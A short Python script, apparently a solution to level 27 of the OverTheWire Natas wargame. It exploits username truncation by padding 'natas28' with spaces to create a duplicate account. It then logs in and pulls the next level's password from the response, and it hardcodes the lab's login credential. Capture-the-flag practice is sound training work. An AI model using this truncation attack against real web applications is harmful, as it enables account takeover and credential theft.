import requests
import re

target = "http://natas27.natas.labs.overthewire.org/"
auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne')
name = "natas28"
params = dict(username=name + ' '*(64-len(name)) + 'x', password="wharever")

print("Creating user...")
r = requests.post(target, auth=auth, params=params)

print("Loggin in into the user")
params = dict(username=name + ' '*(64-len(name)), password="wharever")
r = requests.post(target, auth=auth, params=params)
password_match = re.search(r'\[password\] =&gt; (\w+)', r.text)
if password_match:
    password = password_match.group(1)
    print("Founded!")
    print("The password is: " + password)
else:
    print("Could not find the password in the response")
